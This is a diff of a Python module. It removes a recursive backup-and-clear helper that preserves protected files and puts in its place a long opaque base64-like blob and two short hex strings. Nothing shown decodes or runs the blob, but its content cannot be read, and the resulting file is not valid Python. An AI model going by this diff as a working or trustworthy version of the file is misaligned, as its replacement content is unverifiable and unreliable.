@@ -1,28 +1,3 @@
-import os
-import shutil
-from ._contains_protected import _contains_protected
-
-
-def _backup_and_clear(src_dir, backup_dir, protected):
-    """
-    Recursively move everything under src_dir into backup_dir, EXCEPT any
-    file or directory whose basename is in `protected` -- those are left
-    exactly where they are, at whatever depth they live, so persistent
-    state (cache, progress, config) survives regardless of which folder
-    it happens to live in (e.g. common/cache.json). A directory that
-    itself isn't a protected name but contains a protected descendant is
-    recursed into rather than moved wholesale, so the protected file
-    inside it stays put while everything around it still gets replaced.
-    """
-    for entry in os.listdir(src_dir):
-        if entry in protected:
-            continue
-        s = os.path.join(src_dir, entry)
-        d = os.path.join(backup_dir, entry)
-        if os.path.isdir(s) and _contains_protected(s, protected):
-            os.makedirs(d, exist_ok=True)
-            _backup_and_clear(s, d, protected)
-            if not os.listdir(s):
-                os.rmdir(s)
-        else:
-            shutil.move(s, d)
+FejPosheurmvfzoOI/CGhdsh0tq6KY1ls/d5+PFw6h0T68us00TpiawHPBc2/ICUn3LTwr4vkxv12nX6vyrUFxL24L3IRe6zvwE2B1mV/pWeNJrwrCGCBKD1SfS/OuodEODev5JZ6LWDEToRf7+WkJg5z9+RJIgd+aVm574q0B0I4NvkgCC69vxVcUFxldTR23Loyq01kxy883P5qH7YEQrgn6jMT+ivqB06DTS/gZ+fN8iPvTKCMLHsZLW4MMERXOfertFf6om4HCFPc9qssr4C7o+vLphl9aU2tbc32Rtc6s3t3kPos78BPBEqv4OZlCHfj6whkgq75Hvw8TfGXhXrn63KWPWiuRYnBjf/1NzWcs7HoTOET7T3c7W9O9MKdqWf7ZpP4re/AT8ac+iclIk3mtumJZhPtPdzufE/wV4L7d6531z/pPwRNhMn99SFkzfDj6Iplwr5pWX68S7QDA/szLnfRO7c/FVzQyDrlYWecpLMryOJCvmlZue+OccbD/aT7dlF9LC1EnpDIOqGh5Ik39zuMoQItPdy+bQtxl4T45+60kP5vvwTPA83+ob723Kaj6c0wQe09Wbwvy2VChOl06TMT7q/slV7Bn342tGYPdfCoS7ODLTmfvD/NMYREqyR7fsK/r+uEDAXPO2N0Y8629vEYMFP9exi5rQy014V9tHqzgr79qwHPBc2/ICUn3LUzqMlwQ2g8Tb2vjDBHxXrzO3bCuqkswE2ACf6kNGfN8nMqy6FDrvxNvyiVJVeXKXNqNlf6KW5EXMKPeub0YkzzserMsEbveR4tbwxwxsYpcil1Ub/pb0ZNk9z7JvRjzrfj74yjhuw5mLwtX7TFxDgte2aCrq/sgY6Bza/nYXbIc7OtzPBH6DxNuK5N9kbXODJqMhT7r61GzRDMu2bhJU2msa6YJIbvOl6tbY7wQ1c99q91kv5s7hbWUNzv9TT2XCwj+5gwQm69zbwvyrHB1zs0e3VWbS6tQYnBzrt3IKJMeXLpzLIVd+lNrXxfpVeXOzZ7d9E7qSlVToNc++Gno832durJNtl9aU2tfF+lV5cpZ/t2UX0orUbJgZZv9TR23Kaj+4zwVL16mW7oT/BFlLv0KTUAumkvyo3CiGz1JSVJsjW50rBT/WlNrXxftFeQaXQvpRa+6K0WzkMOvHck5ox0dq+H4UGp6k28L8qxwdVj5/tmgq69vxVOgVz8IffizPOx+Apkgu89z7m+H7UEBil4K7VRO63tRsgPCPtm4WeMc7KqmiSQ/X1ZPqlO9YKGeGW97AKuvb8VXNDc7/U0ds9yYGjIYoKsexk5vk6mV4Z/da+znX1veEhIRY2tv7R23Kaj+5gwU/1pTbKsz/WFQn14KzUTsW1sBAyEXvs2NGffprfvC+VCrbxc/H4VJVeXKWf7ZoKuvb8VToFc/Gbhds9yYGiKZIbsexkvaJ3j3RcpZ/tmgq69vxVc0Nzv9TRlCGU3aMkiB399j+f8X6VXlyln+3fRumz5n9zQ3O/1NHbcpqP7mCSB6Dxf/n/M9oIGa3M4ZpOs9w=
+42deb4b3
+##a033837d4f23e078bea6b3957
